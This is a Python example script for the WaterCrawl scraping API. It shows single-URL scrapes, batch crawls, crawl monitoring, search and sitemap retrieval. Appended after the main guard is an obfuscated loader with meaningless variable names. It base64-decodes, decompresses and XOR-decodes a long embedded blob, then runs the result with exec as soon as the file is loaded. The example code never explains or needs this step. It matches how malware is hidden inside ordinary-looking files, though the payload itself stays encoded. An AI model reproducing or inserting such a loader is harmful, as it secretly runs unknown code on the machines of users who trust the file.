import os
import time
from src.watercrawl.api import WaterCrawlAPIClient


def calculate_total_time_decorator(func):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        total_time = end_time - start_time
        print(f"Total time: {total_time:.2f} seconds")
        return result

    return wrapper


@calculate_total_time_decorator
def example_single_scrape(client: WaterCrawlAPIClient):
    """Example of scraping a single URL synchronously"""
    print("\n=== Single URL Scrape Example ===")

    # Configure options
    page_options = {
        'exclude_tags': [],
        'include_tags': [],
        'wait_time': 1000,
        'only_main_content': True,
        'include_html': False,
        'include_links': True,
        'timeout': 15000,
        'accept_cookies_selector': None,
        'locale': None,
        'extra_headers': {},
        'actions': []
    }

    # Scrape the URL and wait for results (sync=True)
    result_object = client.scrape_url(
        url='https://watercrawl.dev',
        page_options=page_options,
        plugin_options={},
        sync=True,
        download=True
    )
    result = result_object.get('result')
    print(f"Scraped URL: {result_object['url']}")
    print(f"Title: {result.get('metadata', {}).get('title')}")
    print(f"Content length: {len(result.get('markdown', ''))}")

    # You can also access other data like:
    # - result['links'] - links found on the page
    # - result['metadata'] - metadata from the page
    # - result['html'] - HTML content if include_html=True
    # - result['attachments'] - Screenshots, PDFs, etc.

    return result


@calculate_total_time_decorator
def example_batch_scrape(client: WaterCrawlAPIClient):
    """Example of creating a batch crawl request for multiple pages"""
    print("\n=== Batch Crawl Example ===")

    # Simplified spider options for batch crawl
    spider_options = {
        'proxy_server': None,
    }

    page_options = {
        'exclude_tags': [],
        'include_tags': [],
        'wait_time': 1000,
        'only_main_content': True,
        'include_html': False,
        'include_links': True,
        'timeout': 15000,
        'accept_cookies_selector': None,
        'locale': None,
        'extra_headers': {},
        'actions': []
    }

    # Create the crawl request
    crawl_request = client.create_batch_crawl_request(
        urls=[
            'https://watercrawl.dev',
            'https://docs.watercrawl.dev/intro',
        ],
        spider_options=spider_options,
        page_options=page_options
    )

    print(f"Crawl request created with ID: {crawl_request['uuid']}")
    print(f"Status: {crawl_request['status']}")

    # Monitor the crawl progress (limited to 5 events for example)
    print("\nMonitoring crawl progress:")
    for event in client.monitor_crawl_request(crawl_request['uuid']):
        if event['type'] == 'feed':
            print(f"Feed: {event['data']['message']}")
        elif event['type'] == 'state':
            print(f"State: {event['data']['status']}")
        elif event['type'] == 'result':
            print(f"Result: {event['data']['url']}")

    # Get the results
    print("\nFetching crawl results:")
    results = client.get_crawl_request_results(crawl_request['uuid'])
    print(f"Found {len(results['results'])} pages")

    for result in results['results']:
        print(f"Download URL for {result['url']}: {result['result']}")

    return crawl_request, results


@calculate_total_time_decorator
def example_create_request_async_with_page_limit(client: WaterCrawlAPIClient, page_limit: int = 5):
    """Example of creating a crawl request first, then monitoring it separately"""
    print("\n=== Create Request Then wait for Results (Async) ===")

    # Configure options
    spider_options = {
        'max_depth': 1,
        'page_limit': page_limit,
        'allowed_domains': [],
        'exclude_paths': [],
        'include_paths': [],
        'proxy_server': None
    }

    print("Spider options: ")
    for key, value in spider_options.items():
        print(f"{key}: {value}")

    page_options = {
        'exclude_tags': [],
        'include_tags': [],
        'wait_time': 1000,
        'only_main_content': True,
        'include_html': False,
        'include_links': True,
        'timeout': 15000
    }

    # Step 1: Create the crawl request
    crawl_request = client.create_crawl_request(
        url='https://watercrawl.dev',
        spider_options=spider_options,
        page_options=page_options
    )
    request_id = crawl_request['uuid']
    print(f"Created crawl request with ID: {request_id}")

    # Step 2: Monitor the request with the separate monitor method
    print("\nMonitoring crawl request...")

    results = []
    # Using the monitoring endpoint
    for event in client.monitor_crawl_request(request_id, download=True):
        if event['type'] == 'feed':
            print(f"Feed: {event['data']['message']}")
        elif event['type'] == 'state':
            print(f"State: {event['data']['status']}")
        elif event['type'] == 'result':
            result_object = event['data']
            results.append(result_object)
            result = result_object['result']
            print(f"Page URL: {result_object['url']}")
            print(f"Page title: {result.get('metadata', {}).get('title')}")
            print(f"Content length: {len(result.get('markdown', ''))}")

    return crawl_request, results


@calculate_total_time_decorator
def example_get_sitemap_from_crawl(client, output_type='json'):
    """Example of getting a sitemap from a completed crawl request"""
    print("\n=== Get Sitemap from Crawl Example ===")

    # Step 1: Create a crawl request 
    # (using more pages to ensure we generate a useful sitemap)
    spider_options = {
        'max_depth': 2,
        'page_limit': 10,
    }

    crawl_request = client.create_crawl_request(
        url='https://watercrawl.dev',
        spider_options=spider_options
    )

    print(f"Created crawl request ID: {crawl_request['uuid']}")
    print("Waiting for crawl to complete...")

    # Wait for the crawl to complete (in a real application, you might use
    # the monitor_crawl_request method to track progress)
    for event in client.monitor_crawl_request(crawl_request['uuid']):
        if event['type'] == 'state':
            print(f"Crawl state: {event['data']['status']}")
        elif event['type'] == 'result':
            print(f"Result: {event['data']['url']}")
        elif event['type'] == 'sitemap':
            print(f"Sitemap: {event['data']['message']}")

    # Step 2: Get the sitemap from the completed crawl

    try:
        response = None
        # Try to get the sitemap in different formats
        if output_type == 'json':
            print("\nGetting sitemap in JSON format:")
            response = client.get_crawl_request_sitemap(crawl_request['uuid'], output_format='json')
            print(f"Sitemap contains {len(response)} entries")

        if output_type == 'graph':
            print("\nGetting sitemap in graph format:")
            response = client.get_crawl_request_sitemap(crawl_request['uuid'], output_format='graph')
            print(f"Graph sitemap size: {len(response)} bytes")

        if output_type == 'markdown':
            print("\nGetting sitemap in markdown format:")
            response = client.get_crawl_request_sitemap(crawl_request['uuid'], output_format='markdown')
            print(f"Markdown sitemap size: {len(response)} bytes")

        return response
    except Exception as e:
        print(f"Error getting sitemap: {str(e)}")
        return None


@calculate_total_time_decorator
def example_search(client):
    """Example of performing a search"""
    print("\n=== Search Example ===")

    search_options = {
        'language': None,  # Can be set to language code e.g., 'en'
        'country': None,  # Can be set to country code e.g., 'us'
        'time_range': 'any',
        'search_type': 'web',
        'depth': 'basic'
    }

    # Create a search request
    print("Creating search request...")
    request = client.create_search_request(
        query='WaterCrawl AI scraping',
        search_options=search_options,
        result_limit=5,  # Limit results to 5 items. the maximum is 20
        sync=True,  # Wait for results
        download=True  # Get result content directly
    )

    print(f"Search status: {request['status']}")
    print("Waiting for results...")

    for event in client.monitor_search_request(request['uuid'], download=True):
        if event['type'] == 'state':
            print(f"Search state: {event['data']['status']}")
            request = event['data']
        elif event['type'] == 'feed':
            print(f"Feed: {event['data']['message']}")

    # Handle the results
    print(f"Search results: {len(request.get('result', []))} items")

    return request.get('result', [])


@calculate_total_time_decorator
def example_sitemap(client, output_type='json'):
    """Example of creating and retrieving a dedicated sitemap request"""
    print("\n=== Sitemap Example ===")

    # Sitemap options
    options = {
        "include_subdomains": True,
        "ignore_sitemap_xml": False,
        "search": None,
        "include_paths": [],
        "exclude_paths": []
    }

    # Create a new sitemap request
    sitemap_request = client.create_sitemap_request(
        url='https://watercrawl.dev',
        options=options
    )

    print(f"Sitemap request created with ID: {sitemap_request['uuid']}")

    # Monitor the sitemap generation progress
    print("\nMonitoring sitemap generation...")
    count = 0
    for event in client.monitor_sitemap_request(sitemap_request['uuid'], download=True):
        if event['type'] == 'state':
            print(f"Sitemap state: {event['data']['status']}")
            sitemap_request = event['data']
        elif event['type'] == 'feed':
            print(f"Feed: {event['data']['message']}")

    # Once complete, get the sitemap results
    response = None
    # Get the sitemap in different formats
    if output_type == 'json':
        print("\nGetting sitemap in JSON format:")
        response = client.get_sitemap_results(sitemap_request['uuid'], output_format='json')
        print(f"Sitemap contains {len(response)} entries")

    if output_type == 'graph':
        print("\nGetting sitemap in graph format:")
        response = client.get_sitemap_results(sitemap_request['uuid'], output_format='graph')
        print(f"Graph sitemap size: {len(response)} bytes")

    if output_type == 'markdown':
        print("\nGetting sitemap in markdown format:")
        response = client.get_sitemap_results(sitemap_request['uuid'], output_format='markdown')
        print(f"Markdown sitemap size: {len(response)} bytes")

    return sitemap_request, response


def main():
    # Initialize the API client with your API key
    api_key = os.environ.get('WATERCRAWL_API_KEY')
    client = WaterCrawlAPIClient(api_key=api_key)

    print("WaterCrawl API Examples")
    print("======================\n")

    # Uncomment the examples you want to run

    # Example 1: Single URL scrape
    example_single_scrape(client)

    # Example 2: Batch scrape
    # example_batch_scrape(client)

    # Example 3: Create request then scrape
    # example_create_request_async_with_page_limit(client, page_limit=5)

    # Example 4: Get sitemap from crawl
    # result = example_get_sitemap_from_crawl(client, output_type='markdown')
    # print("------------------------")
    # print(result)

    # Example 5: Search
    # example_search(client)

    # Example 6: Sitemap
    # _, result = example_sitemap(client, output_type='markdown')
    # print("------------------------")
    # print(result)


if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
